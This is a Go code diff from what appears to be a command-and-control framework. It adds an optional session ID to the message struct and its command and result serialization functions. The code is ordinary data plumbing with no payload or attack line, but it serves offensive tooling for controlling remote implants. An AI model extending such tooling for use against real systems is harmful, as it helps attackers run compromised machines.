@@ -22,12 +22,13 @@ var (
 
 // C2Message represents a C2 command or result message.
 type C2Message struct {
-	Module string                 `json:"module"`
-	Seq    int                    `json:"seq"`
-	Args   map[string]interface{} `json:"args,omitempty"`
-	Status string                 `json:"status,omitempty"`
-	Data   string                 `json:"data,omitempty"`
-	Ts     float64                `json:"ts"`
+	Module    string                 `json:"module"`
+	Seq       int                    `json:"seq"`
+	Args      map[string]interface{} `json:"args,omitempty"`
+	Status    string                 `json:"status,omitempty"`
+	Data      string                 `json:"data,omitempty"`
+	Ts        float64                `json:"ts"`
+	SessionID string                 `json:"sid,omitempty"`
 }
 
 // NewC2Message creates a new C2Message with current timestamp.
@@ -42,31 +43,40 @@ func NewC2Message(module string, seq int) *C2Message {
 
 // ToCommandMap serializes as a command dict for transmission.
 func (m *C2Message) ToCommandMap() map[string]interface{} {
-	return map[string]interface{}{
+	d := map[string]interface{}{
 		"module": m.Module,
 		"args":   m.Args,
 		"seq":    m.Seq,
 		"ts":     m.Ts,
 	}
+	if m.SessionID != "" {
+		d["sid"] = m.SessionID
+	}
+	return d
 }
 
 // ToResultMap serializes as a result dict for transmission.
 func (m *C2Message) ToResultMap() map[string]interface{} {
-	return map[string]interface{}{
+	d := map[string]interface{}{
 		"seq":    m.Seq,
 		"module": m.Module,
 		"status": m.Status,
 		"data":   m.Data,
 		"ts":     m.Ts,
 	}
+	if m.SessionID != "" {
+		d["sid"] = m.SessionID
+	}
+	return d
 }
 
 // FromCommandMap deserializes a command dict.
 func FromCommandMap(d map[string]interface{}) *C2Message {
 	msg := &C2Message{
-		Module: getString(d, "module"),
-		Seq:    getInt(d, "seq"),
-		Ts:     getFloat(d, "ts"),
+		Module:    getString(d, "module"),
+		Seq:       getInt(d, "seq"),
+		Ts:        getFloat(d, "ts"),
+		SessionID: getString(d, "sid"),
 	}
 	if args, ok := d["args"]; ok && args != nil {
 		if argsMap, ok := args.(map[string]interface{}); ok {
@@ -82,11 +92,12 @@ func FromCommandMap(d map[string]interface{}) *C2Message {
 // FromResultMap deserializes a result dict.
 func FromResultMap(d map[string]interface{}) *C2Message {
 	return &C2Message{
-		Module: getString(d, "module"),
-		Seq:    getInt(d, "seq"),
-		Status: getString(d, "status"),
-		Data:   getString(d, "data"),
-		Ts:     getFloat(d, "ts"),
+		Module:    getString(d, "module"),
+		Seq:       getInt(d, "seq"),
+		Status:    getString(d, "status"),
+		Data:      getString(d, "data"),
+		Ts:        getFloat(d, "ts"),
+		SessionID: getString(d, "sid"),
 	}
 }
 
